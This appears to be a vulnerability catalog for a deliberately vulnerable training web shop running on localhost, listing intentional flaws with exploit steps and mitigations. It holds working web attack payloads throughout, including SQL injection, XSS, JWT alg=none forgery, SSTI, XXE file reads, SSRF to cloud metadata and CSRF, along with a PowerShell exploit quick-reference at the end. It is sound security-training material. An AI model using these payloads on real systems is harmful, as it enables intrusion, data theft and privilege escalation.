@@ -1,0 +1,363 @@
+NORTHWIND OUTFITTERS  --  VulnShop Vulnerability Catalog
+==========================================================
+
+This file documents every intentional vulnerability shipped in vuln-shop.
+For each entry: ID, category, location, manual exploit steps, mitigation.
+All vulnerabilities are reachable from a fresh seed; smoke-test.ps1 exercises
+the majority automatically.
+
+Base URL: http://127.0.0.1:3002
+Email service: http://127.0.0.1:5002 (Flask, SSTI sink)
+Default users (see seed.js for the full list):
+  olivia.park       / OliviaP!23     (customer)
+  samuel.kim        / samkimsam      (customer)
+  james.olsson      / IceClimber1    (customer, $1850 credits)
+  admin_kate        / AdminKate!1    (admin)
+
+
+-----------------------------------------------------------------
+SQL INJECTION
+-----------------------------------------------------------------
+
+V-SHOP-001  SQL injection on /auth/login
+  Location:  routes/auth.js  (LOGIN_SQL string interpolation)
+  Exploit:   POST /auth/login
+             username=anything' OR '1'='1' --
+             password=anything
+             Authenticates as the first row in users (olivia.park).
+  Mitigation: use parameterised queries (db.prepare('... WHERE username = ?')).
+
+V-SHOP-002  SQL injection on /products/search
+  Location:  routes/products.js  (search uses string concatenation)
+  Exploit:   GET /products/search?q=cap' UNION SELECT id,username,password_md5,
+             email,full_name,address,role,0,0,'a','a' FROM users--
+             Dumps password hashes into the catalog grid.
+  Mitigation: parameterised LIKE query + allow-list of order-by columns.
+
+V-SHOP-003  SQL injection on /admin/users?q=
+  Location:  routes/admin.js  (admin/users search)
+  Exploit:   GET /admin/users?q=' OR 1=1--   (after auth_token cookie)
+             Returns every user including password_md5.
+  Mitigation: parameterise, and never SELECT password columns into views.
+
+
+-----------------------------------------------------------------
+CROSS-SITE SCRIPTING
+-----------------------------------------------------------------
+
+V-SHOP-010  Reflected XSS on /products/search
+  Location:  views/product_search.ejs  (<%- q %>)
+  Exploit:   GET /products/search?q=<script>alert(1)</script>
+  Mitigation: render with <%= q %> (HTML-escape) or use a stricter template
+              helper for untrusted strings.
+
+V-SHOP-011  Stored XSS in reviews
+  Location:  views/product_detail.ejs  (<%- r.body %>)
+  Exploit:   POST /products/1/reviews  body=<img src=x onerror=alert(1)>
+             GET  /products/1   -- payload fires for every visitor.
+  Mitigation: sanitise on save (DOMPurify) and render escaped on display.
+
+V-SHOP-012  Stored XSS via order shipping address
+  Location:  views/order_detail.ejs and views/admin.ejs (<%- o.shipping_address %>)
+  Exploit:   Place an order with shipping_address=<svg onload=alert(1)>; the
+             admin dashboard fires the script when staff opens the order.
+  Mitigation: HTML-escape user-supplied text everywhere, not just on customer
+              pages.
+
+V-SHOP-013  DOM XSS via location.hash
+  Location:  public/js/app.js  (slot.innerHTML = decodeURIComponent(hash))
+  Exploit:   Browse http://127.0.0.1:3002/#<img src=x onerror=alert(1)>
+  Mitigation: never assign untrusted input to .innerHTML; use textContent.
+
+V-SHOP-014  HTML rendering of support subject in admin
+  Location:  views/admin.ejs (<%- s.subject %>, <%- s.body %>)
+  Exploit:   POST /contact subject=<script>fetch('/admin/promote/8')</script>
+             When admin_kate views /admin the script promotes user 8.
+  Mitigation: escape contact form output on render.
+
+
+-----------------------------------------------------------------
+AUTHENTICATION & SESSION
+-----------------------------------------------------------------
+
+V-SHOP-020  JWT alg=none accepted
+  Location:  lib/auth.js  (verifyToken trusts unsigned tokens)
+  Exploit:   header  {"alg":"none","typ":"JWT"}
+             payload {"uid":10,"role":"admin"}
+             token=<b64h>.<b64p>.
+             Send as Authorization: Bearer <token>   or as auth_token cookie.
+             GET /api/me -> returns admin row.
+  Mitigation: require alg=HS256 and reject anything else.
+
+V-SHOP-021  Weak hard-coded JWT secret
+  Location:  lib/auth.js  (JWT_SECRET = 'shop-dev-secret-2024')
+  Exploit:   Crack with hashcat -m 16500 (HMAC-SHA256 JWT) using rockyou.
+  Mitigation: generate a 256-bit random secret per environment, store in env.
+
+V-SHOP-022  Unsalted MD5 password hashing
+  Location:  lib/auth.js (md5) + users.password_md5
+  Exploit:   After dumping users (V-SHOP-002) crack MD5s offline; a 1080Ti
+             does billions of MD5/s.
+  Mitigation: argon2id with per-user salt + reasonable memory cost.
+
+V-SHOP-023  Session cookie lacks security flags
+  Location:  server.js (cookie: { httpOnly: false, secure: false, sameSite: false })
+  Exploit:   document.cookie steals the session id from any XSS vector.
+  Mitigation: httpOnly + secure + sameSite=Lax|Strict.
+
+V-SHOP-024  Mass-assignment on /auth/register
+  Location:  routes/auth.js (Object.assign / spread of req.body)
+  Exploit:   POST /auth/register  username=evil&password=x&role=admin
+             &credits_cents=9999999
+             Creates an admin account with $99,999 credits.
+  Mitigation: allow-list of writable fields (username, password, email,
+              full_name, address) and ignore everything else.
+
+
+-----------------------------------------------------------------
+ACCESS CONTROL
+-----------------------------------------------------------------
+
+V-SHOP-030  Broken access control on /admin
+  Location:  routes/admin.js (no requireAdmin middleware)
+  Exploit:   GET /admin while logged in as any customer.
+  Mitigation: requireAdmin (and require session, not just cookie) on every
+              /admin route.
+
+V-SHOP-031  IDOR on /cart/:id
+  Location:  routes/cart.js (lookup by URL id, no owner check)
+  Exploit:   GET /cart/2 when your own cart is 1 -> view another user's cart.
+  Mitigation: SELECT ... WHERE id=? AND user_id=?
+
+V-SHOP-032  IDOR on /orders/:id
+  Location:  routes/orders.js
+  Exploit:   GET /orders/3 with olivia.park's session reveals samuel.kim's order.
+  Mitigation: enforce user_id ownership before rendering.
+
+V-SHOP-033  BOLA on /api/users/:id and /api/orders/:id
+  Location:  routes/api.js
+  Exploit:   curl http://127.0.0.1:3002/api/users/10 -H "auth: <olivia jwt>"
+             returns admin_kate's row.
+  Mitigation: same as V-SHOP-031.
+
+V-SHOP-034  No-auth bulk dump on /api/v1/users
+  Location:  routes/api.js (/v1/users mounted under /api)
+  Exploit:   curl http://127.0.0.1:3002/api/v1/users
+             returns every user JSON (no token required).
+  Mitigation: require auth + role=admin + remove this endpoint.
+
+V-SHOP-035  Toy GraphQL endpoint without auth
+  Location:  routes/api.js  POST /api/graphql
+  Exploit:   curl -X POST /api/graphql -d '{"query":"{ users { id username role } }"}'
+             Returns every user.
+  Mitigation: require auth, use a real GraphQL server with field-level perms.
+
+V-SHOP-036  Privilege escalation via GET /admin/promote/:id
+  Location:  routes/admin.js
+  Exploit:   Trick an admin into clicking
+             http://127.0.0.1:3002/admin/promote/9 (CSRF, V-SHOP-052).
+             Or any user can hit it directly (no role check).
+  Mitigation: requireAdmin + CSRF token + POST only.
+
+V-SHOP-037  Mass-assignment via PUT /api/users/:id
+  Location:  routes/api.js
+  Exploit:   curl -X PUT /api/users/3 -H "Content-Type: application/json"
+             -d '{"role":"admin","credits_cents":100000000}'
+             Any user can promote themselves and mint credits.
+  Mitigation: allow-list updatable fields per role.
+
+
+-----------------------------------------------------------------
+INJECTION & DESERIALISATION
+-----------------------------------------------------------------
+
+V-SHOP-040  Prototype pollution via /profile
+  Location:  routes/profile.js (unsafeDeepMerge into req.user)
+  Exploit:   POST /profile  (JSON body)
+             { "settings": { "__proto__": { "isAdmin": true } } }
+             Then GET /profile/perks-check -> returns admin perks because
+             Object.prototype.isAdmin is now true for every object.
+  Mitigation: never deep-merge raw req.body; if you must, use a safe merge that
+              skips __proto__/constructor/prototype.
+
+V-SHOP-041  SSTI via /contact (Jinja2 in email-service)
+  Location:  routes/contact.js -> email-service/email_service.py
+             render_template_string(subject + ' :: ' + body)
+  Exploit:   POST /contact  subject={{7*7}}  body=hi
+             Response body contains '49 :: hi'.  Escalation:
+             subject={{ ''.__class__.__mro__[1].__subclasses__() }}
+  Mitigation: never render user input as a template; use render_template with
+              named context vars only.
+
+V-SHOP-042  XXE on /import/xml
+  Location:  routes/import.js (custom DTD entity resolver fetches file:// + http://)
+  Exploit:   POST /import/xml  Content-Type: application/xml
+             <!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/Windows/win.ini">]>
+             <r>&x;</r>
+             Response echoes the file contents.  Also works with http:// to the
+             email-service for SSRF chaining.
+  Mitigation: use a parser without external entity support; reject DOCTYPE
+              entirely.
+
+V-SHOP-043  Open redirect on /go?u=
+  Location:  routes/api.js (or server.js, GET /go)
+  Exploit:   /go?u=https://attacker.example/phish
+  Mitigation: allow-list of relative paths or explicit hostnames.
+
+
+-----------------------------------------------------------------
+BUSINESS LOGIC
+-----------------------------------------------------------------
+
+V-SHOP-050  Price tampering on POST /cart/add
+  Location:  routes/cart.js (price_cents read from req.body)
+  Exploit:   POST /cart/add  product_id=11 (tent $249.99)  qty=1  price_cents=1
+             Tent gets added at $0.01.
+  Mitigation: server looks up price from products table, ignores client field.
+
+V-SHOP-051  Negative quantity accepted on /checkout
+  Location:  routes/checkout.js
+  Exploit:   Add product A and product B with qty=-1 to lower the order total.
+  Mitigation: validate qty >= 1.
+
+V-SHOP-052  CSRF on state-changing GET endpoints
+  Location:  routes/cart.js GET /cart/remove/:id, routes/admin.js GET /admin/promote/:id
+  Exploit:   <img src="http://127.0.0.1:3002/admin/promote/9"> on an external
+             site; if admin_kate is logged in, user 9 becomes admin.
+  Mitigation: state-changing actions over POST + CSRF token + SameSite cookie.
+
+V-SHOP-053  Coupon code enumeration
+  Location:  routes/checkout.js (good code -> 200 with %, bad code -> 404)
+  Exploit:   for c in candidates: POST /checkout/coupon code=$c; distinguish
+             200 vs 404 -> discovers STAFF50.
+  Mitigation: constant-time response (always 200 with generic message);
+              rate-limit.
+
+V-SHOP-054  Coupon reuse (no per-user use limit)
+  Location:  routes/checkout.js
+  Exploit:   Apply STAFF50 (50% off) on dozens of orders with the same account.
+  Mitigation: track redemptions per user + global cap.
+
+V-SHOP-055  Race condition on inventory decrement
+  Location:  routes/checkout.js (40 ms window between stock check and update)
+  Exploit:   Send 20 simultaneous POST /checkout for the last item in stock;
+             multiple orders succeed against stock=1.
+  Mitigation: UPDATE products SET stock = stock - ? WHERE id=? AND stock >= ?
+              and check rowcount.
+
+
+-----------------------------------------------------------------
+SSRF / FILE UPLOAD / PATH TRAVERSAL
+-----------------------------------------------------------------
+
+V-SHOP-060  SSRF on /proxy/image?u=
+  Location:  routes/proxy.js (fetches arbitrary URL, returns body)
+  Exploit:   /proxy/image?u=http://127.0.0.1:5002/debug
+             /proxy/image?u=http://169.254.169.254/latest/meta-data/
+  Mitigation: allow-list outbound hosts; block RFC1918 + link-local.
+
+V-SHOP-061  Unrestricted file upload on /admin/upload
+  Location:  routes/admin.js (multer keeps originalname, no MIME check)
+  Exploit:   POST /admin/upload file=@payload.html
+             Then visit /uploads/payload.html -> renders as HTML in same
+             origin; if you have admin session, /uploads serves anything.
+  Mitigation: validate MIME + magic bytes, force safe extension, serve
+              uploads from a separate origin or with Content-Disposition.
+
+V-SHOP-062  Path traversal via uploaded filename
+  Location:  routes/admin.js / lib/uploads write path
+  Exploit:   Upload with filename ../../seed.js -> overwrites the seed file.
+  Mitigation: never trust originalname; use a generated UUID + sanitised ext.
+
+
+-----------------------------------------------------------------
+TRANSPORT / HEADER / CORS
+-----------------------------------------------------------------
+
+V-SHOP-070  CORS reflection with credentials
+  Location:  routes/api.js  (Access-Control-Allow-Origin echoes Origin)
+  Exploit:   from attacker.example: fetch('http://127.0.0.1:3002/api/me',
+             {credentials:'include'}).then(r=>r.json()) leaks the victim row.
+  Mitigation: allow-list of origins; never reflect with credentials=true.
+
+V-SHOP-071  Cache poisoning via X-Forwarded-Host
+  Location:  routes/admin.js (rewrites links from X-Forwarded-Host header)
+  Exploit:   curl /admin -H "X-Forwarded-Host: evil.example" -> response now
+             references evil.example for login links.  Behind a cache, the
+             poisoned page is served to other admins.
+  Mitigation: ignore X-Forwarded-Host or only honour from trusted proxies.
+
+V-SHOP-072  Missing security headers + vulnerable jQuery
+  Location:  views/partials/header.ejs loads jQuery 1.12.4 from CDN; no
+             Content-Security-Policy, X-Frame-Options, X-Content-Type-Options.
+  Exploit:   jQuery 1.12.4 CVE-2019-11358 (prototype pollution via
+             $.extend(true, {}, JSON.parse(payload))).
+  Mitigation: jQuery >= 3.5 (or no jQuery), add CSP, X-Frame-Options=DENY,
+              X-Content-Type-Options=nosniff.
+
+V-SHOP-073  Vulnerability disclosure on /debug
+  Location:  server.js (always-on /debug endpoint dumping env+session+headers)
+  Exploit:   curl /debug
+  Mitigation: remove debug surface in production builds.
+
+V-SHOP-074  Stack trace leakage in error handler
+  Location:  server.js (error middleware returns err.stack as response body)
+  Exploit:   /products/abc (string id -> SQL parse error stack)
+  Mitigation: generic 500 to clients; full stack only to logs.
+
+V-SHOP-075  Source map disclosure
+  Location:  public/js/app.js references //# sourceMappingURL=app.js.map
+             which contains sourcesContent with fake secrets.
+  Exploit:   curl /static/js/app.js.map | jq .sourcesContent
+  Mitigation: do not ship .map files to production; or restrict by IP.
+
+V-SHOP-076  Secret in client bundle
+  Location:  public/js/app.js (window.__NORTHWIND__.shopifyKey)
+  Exploit:   view-source on any page; grep for sk_test_.
+  Mitigation: keep all secrets server-side.
+
+
+-----------------------------------------------------------------
+RATE / DOS
+-----------------------------------------------------------------
+
+V-SHOP-080  No rate limiting anywhere
+  Location:  server.js  (no express-rate-limit middleware)
+  Exploit:   1000 POST /auth/login attempts in parallel succeed.
+  Mitigation: per-IP and per-account throttling.
+
+
+-----------------------------------------------------------------
+EXPLOIT QUICK-REFERENCE (PowerShell 5.1)
+-----------------------------------------------------------------
+
+  # SQLi login
+  Invoke-WebRequest -UseBasicParsing http://127.0.0.1:3002/auth/login `
+    -Method POST -ContentType "application/x-www-form-urlencoded" `
+    -Body "username=admin' OR '1'='1' --&password=x"
+
+  # Stored XSS review
+  Invoke-WebRequest http://127.0.0.1:3002/products/1/reviews -Method POST `
+    -ContentType "application/x-www-form-urlencoded" `
+    -Body "rating=5&body=<img src=x onerror=alert(1)>" -WebSession $s
+
+  # Price tampering
+  Invoke-WebRequest http://127.0.0.1:3002/cart/add -Method POST `
+    -ContentType "application/x-www-form-urlencoded" `
+    -Body "product_id=11&qty=1&price_cents=1" -WebSession $s
+
+  # SSTI via contact -> email-service
+  Invoke-WebRequest http://127.0.0.1:3002/contact -Method POST `
+    -ContentType "application/x-www-form-urlencoded" `
+    -Body "subject={{7*7}}&body=hi" -WebSession $s
+
+  # XXE
+  $xml = "<!DOCTYPE r [<!ENTITY x SYSTEM ""file:///C:/Windows/win.ini"">]><r>&x;</r>"
+  Invoke-WebRequest http://127.0.0.1:3002/import/xml -Method POST `
+    -ContentType "application/xml" -Body $xml
+
+  # JWT alg=none
+  $h = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"alg":"none","typ":"JWT"}')).TrimEnd('=').Replace('+','-').Replace('/','_')
+  $p = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"uid":10,"role":"admin"}')).TrimEnd('=').Replace('+','-').Replace('/','_')
+  $jwt = "$h.$p."
+  Invoke-WebRequest http://127.0.0.1:3002/api/me -Headers @{Authorization="Bearer $jwt"}
